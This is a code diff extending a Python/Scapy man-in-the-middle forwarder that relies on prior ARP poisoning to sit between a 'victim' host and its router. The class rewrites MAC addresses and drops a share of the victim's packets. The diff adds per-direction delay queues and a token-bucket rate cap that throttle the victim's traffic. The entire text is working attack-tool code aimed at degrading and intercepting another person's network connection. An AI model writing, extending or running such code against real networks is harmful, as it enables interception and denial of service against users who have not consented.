@@ -1,4 +1,13 @@
+import heapq
+import threading
+import time
+
 from scapy.all import IP, Ether, AsyncSniffer, conf
+
+# MITM user-space shaping limits (experimental).
+_MAX_DELAY_MS = 800
+_MAX_DELAY_QUEUE_PACKETS = 500
+_MAX_SHAPING_KBPS = 1_000_000.0
 
 
 class MitmForwarder:
@@ -6,6 +15,10 @@ class MitmForwarder:
     Simple user-space forwarder that optionally drops traffic in one direction.
     It assumes ARP poisoning is already in place so frames arrive at our NIC.
     Uses persistent L2 socket to avoid Windows socket exhaustion.
+
+    Optional experimental shaping (same MITM path as percent cut):
+    - Per-direction fixed delay (queued send, milliseconds).
+    - Per-direction token-bucket rate cap (Kbps); excess packets are dropped.
     """
 
     def __init__(self, debug=False):
@@ -19,6 +32,10 @@ class MitmForwarder:
         self.drop_to_victim = False
         self.pass_from_victim_pct = 100
         self.pass_to_victim_pct = 100
+        self.delay_ms_from_victim = 0
+        self.delay_ms_to_victim = 0
+        self.max_kbps_from_victim = 0.0
+        self.max_kbps_to_victim = 0.0
         self._pkt_count = 0
         self._drop_count = 0
         self._fwd_count = 0
@@ -26,6 +43,16 @@ class MitmForwarder:
         self._socket = None  # Persistent L2 socket
         self._byte_budget_from_victim = 0.0
         self._byte_budget_to_victim = 0.0
+        self._send_lock = threading.Lock()
+        self._delay_heap = []
+        self._delay_lock = threading.Lock()
+        self._delay_seq = 0
+        self._delay_event = threading.Event()
+        self._delay_thread = None
+        self._bucket_last_out = None
+        self._bucket_tokens_out = 0.0
+        self._bucket_last_in = None
+        self._bucket_tokens_in = 0.0
 
     def start(
         self,
@@ -33,11 +60,15 @@ class MitmForwarder:
         router: dict,
         iface_name: str,
         iface_mac: str,
-        should_drop=None,
+        should_drop=None,  # unused; kept for call compatibility
         drop_from_victim: bool = False,
         drop_to_victim: bool = False,
         pass_from_victim_pct: int = 100,
         pass_to_victim_pct: int = 100,
+        delay_ms_from_victim: int = 0,
+        delay_ms_to_victim: int = 0,
+        max_kbps_from_victim: float = 0.0,
+        max_kbps_to_victim: float = 0.0,
     ):
         """
         Start capturing traffic for victim/router and rewrite MACs before sending.
@@ -51,8 +82,17 @@ class MitmForwarder:
         self.drop_to_victim = drop_to_victim
         self.pass_from_victim_pct = max(0, min(100, int(pass_from_victim_pct)))
         self.pass_to_victim_pct = max(0, min(100, int(pass_to_victim_pct)))
+        self.delay_ms_from_victim = max(0, min(_MAX_DELAY_MS, int(delay_ms_from_victim)))
+        self.delay_ms_to_victim = max(0, min(_MAX_DELAY_MS, int(delay_ms_to_victim)))
+        self.max_kbps_from_victim = max(0.0, min(_MAX_SHAPING_KBPS, float(max_kbps_from_victim)))
+        self.max_kbps_to_victim = max(0.0, min(_MAX_SHAPING_KBPS, float(max_kbps_to_victim)))
         self._byte_budget_from_victim = 0.0
         self._byte_budget_to_victim = 0.0
+        self._bucket_last_out = None
+        self._bucket_tokens_out = 0.0
+        self._bucket_last_in = None
+        self._bucket_tokens_in = 0.0
+        self._delay_seq = 0
         self.running = True
 
         if not (self.victim.get('ip') and self.victim.get('mac')):
@@ -79,10 +119,22 @@ class MitmForwarder:
             print(f"[forwarder] Starting on {self.iface}")
             print(f"[forwarder] victim={self.victim['ip']}/{self.victim['mac']}")
             print(f"[forwarder] router={self.router['ip']}/{self.router['mac']}")
-            print(f"[forwarder] drop_from_victim={self.drop_from_victim}, drop_to_victim={self.drop_to_victim}")
+            print(
+                "[forwarder] drop_from_victim=%s, drop_to_victim=%s"
+                % (self.drop_from_victim, self.drop_to_victim)
+            )
             print(
                 "[forwarder] pass_from_victim_pct=%s, pass_to_victim_pct=%s"
                 % (self.pass_from_victim_pct, self.pass_to_victim_pct)
+            )
+            print(
+                "[forwarder] delay_ms out/in=%s/%s max_kbps out/in=%s/%s"
+                % (
+                    self.delay_ms_from_victim,
+                    self.delay_ms_to_victim,
+                    self.max_kbps_from_victim,
+                    self.max_kbps_to_victim,
+                )
             )
         try:
             self.sniffer = AsyncSniffer(
@@ -99,8 +151,24 @@ class MitmForwarder:
                 print(f"[forwarder] Sniffer failed: {e}")
             self.running = False
             self.sniffer = None
+            if self._socket:
+                try:
+                    self._socket.close()
+                except Exception:
+                    pass
+                self._socket = None
+            return
+
+        if self.delay_ms_from_victim > 0 or self.delay_ms_to_victim > 0:
+            self._delay_event.clear()
+            self._delay_thread = threading.Thread(target=self._delay_worker, daemon=True)
+            self._delay_thread.start()
 
     def stop(self):
+        self.running = False
+        self._delay_event.set()
+        with self._delay_lock:
+            self._delay_heap.clear()
         if self.sniffer:
             try:
                 self.sniffer.stop()
@@ -114,8 +182,7 @@ class MitmForwarder:
             except Exception:
                 pass
             self._socket = None
-        self.running = False
-    
+
     def get_stats(self):
         """Return current packet statistics"""
         return {
@@ -127,7 +194,73 @@ class MitmForwarder:
             'drop_to_victim': self.drop_to_victim,
             'pass_from_victim_pct': self.pass_from_victim_pct,
             'pass_to_victim_pct': self.pass_to_victim_pct,
+            'delay_ms_from_victim': self.delay_ms_from_victim,
+            'delay_ms_to_victim': self.delay_ms_to_victim,
+            'max_kbps_from_victim': self.max_kbps_from_victim,
+            'max_kbps_to_victim': self.max_kbps_to_victim,
         }
+
+    def _delay_worker(self):
+        while self.running:
+            with self._delay_lock:
+                empty = len(self._delay_heap) == 0
+            if empty:
+                self._delay_event.wait(timeout=0.25)
+            if not self.running:
+                break
+            now = time.monotonic()
+            while self.running:
+                raw = None
+                with self._delay_lock:
+                    if not self._delay_heap or self._delay_heap[0][0] > now:
+                        break
+                    _, __, raw = heapq.heappop(self._delay_heap)
+                if raw is not None:
+                    self._send_raw(raw)
+                    self._fwd_count += 1
+                now = time.monotonic()
+
+    def _enqueue_delayed(self, raw: bytes, delay_ms: int) -> bool:
+        delay_ms = max(0, min(_MAX_DELAY_MS, int(delay_ms)))
+        if delay_ms <= 0:
+            return False
+        rel = time.monotonic() + delay_ms / 1000.0
+        with self._delay_lock:
+            if len(self._delay_heap) >= _MAX_DELAY_QUEUE_PACKETS:
+                return False
+            self._delay_seq += 1
+            heapq.heappush(self._delay_heap, (rel, self._delay_seq, raw))
+        self._delay_event.set()
+        return True
+
+    def _token_bucket_allow(self, direction: str, nbytes: int, now: float) -> bool:
+        """direction 'out' = victim -> router, 'in' = router -> victim."""
+        if direction == 'out':
+            max_kbps = self.max_kbps_from_victim
+            last_attr = '_bucket_last_out'
+            tok_attr = '_bucket_tokens_out'
+        else:
+            max_kbps = self.max_kbps_to_victim
+            last_attr = '_bucket_last_in'
+            tok_attr = '_bucket_tokens_in'
+        if max_kbps <= 0:
+            return True
+        rate = max_kbps * 1000.0 / 8.0
+        burst_max = max(rate * 0.12, float(nbytes))
+        last = getattr(self, last_attr)
+        tokens = getattr(self, tok_attr)
+        if last is None:
+            tokens = min(burst_max, rate * 0.05 + float(nbytes))
+            setattr(self, last_attr, now)
+        else:
+            dt = max(0.0, now - last)
+            tokens = min(burst_max, tokens + dt * rate)
+            setattr(self, last_attr, now)
+        if tokens >= nbytes:
+            setattr(self, tok_attr, tokens - nbytes)
+            return True
+        setattr(self, tok_attr, tokens)
+        return False
 
     def _passes_ratio(self, pass_pct: int, direction: str, pkt_size: int) -> bool:
         pct = max(0, min(100, int(pass_pct)))
@@ -162,19 +295,31 @@ class MitmForwarder:
         if self._debug and self._pkt_count <= 5:
             print(f"[forwarder] pkt#{self._pkt_count}: {src} -> {dst}")
 
+        now = time.monotonic()
+        sz = self._packet_size_bytes(pkt)
+
         # Outbound: victim -> router/internet
         if src == self.victim['ip']:
             if self.drop_from_victim:
                 self._drop_count += 1
                 if self._debug and self._drop_count <= 3:
                     print(f"[forwarder] DROPPING outbound: {src} -> {dst}")
-                return  # packet dies here
-            if not self._passes_ratio(self.pass_from_victim_pct, 'out', self._packet_size_bytes(pkt)):
+                return
+            if not self._passes_ratio(self.pass_from_victim_pct, 'out', sz):
+                self._drop_count += 1
+                return
+            if not self._token_bucket_allow('out', sz, now):
                 self._drop_count += 1
                 return
             pkt[Ether].src = self.my_mac
             pkt[Ether].dst = self.router['mac']
             self._fix_checksums(pkt)
+            if self.delay_ms_from_victim > 0:
+                raw = bytes(pkt)
+                if self._enqueue_delayed(raw, self.delay_ms_from_victim):
+                    return
+                self._drop_count += 1
+                return
             self._send(pkt)
             self._fwd_count += 1
 
@@ -185,30 +330,51 @@ class MitmForwarder:
                 if self._debug and self._drop_count <= 3:
                     print(f"[forwarder] DROPPING inbound: {src} -> {dst}")
                 return
-            if not self._passes_ratio(self.pass_to_victim_pct, 'in', self._packet_size_bytes(pkt)):
+            if not self._passes_ratio(self.pass_to_victim_pct, 'in', sz):
+                self._drop_count += 1
+                return
+            if not self._token_bucket_allow('in', sz, now):
                 self._drop_count += 1
                 return
             pkt[Ether].src = self.my_mac
             pkt[Ether].dst = self.victim['mac']
             self._fix_checksums(pkt)
+            if self.delay_ms_to_victim > 0:
+                raw = bytes(pkt)
+                if self._enqueue_delayed(raw, self.delay_ms_to_victim):
+                    return
+                self._drop_count += 1
+                return
             self._send(pkt)
             self._fwd_count += 1
-        
+
         # Periodic stats
         if self._debug and self._pkt_count % 100 == 0:
             print(f"[forwarder] stats: {self._pkt_count} seen, {self._drop_count} dropped, {self._fwd_count} fwd")
 
     def _send(self, pkt):
         """Send using persistent socket, prevents Windows socket exhaustion"""
-        try:
-            if self._socket:
-                self._socket.send(pkt)
-            else:
-                # Fallback (shouldn't happen normally)
-                from scapy.all import sendp
-                sendp(pkt, iface=self.iface, verbose=0)
-        except Exception:
-            pass
+        with self._send_lock:
+            try:
+                if self._socket:
+                    self._socket.send(pkt)
+                else:
+                    from scapy.all import sendp
+                    sendp(pkt, iface=self.iface, verbose=0)
+            except Exception:
+                pass
+
+    def _send_raw(self, raw: bytes):
+        with self._send_lock:
+            try:
+                pkt = Ether(raw)
+                if self._socket:
+                    self._socket.send(pkt)
+                else:
+                    from scapy.all import sendp
+                    sendp(pkt, iface=self.iface, verbose=0)
+            except Exception:
+                pass
 
     @staticmethod
     def _fix_checksums(pkt):
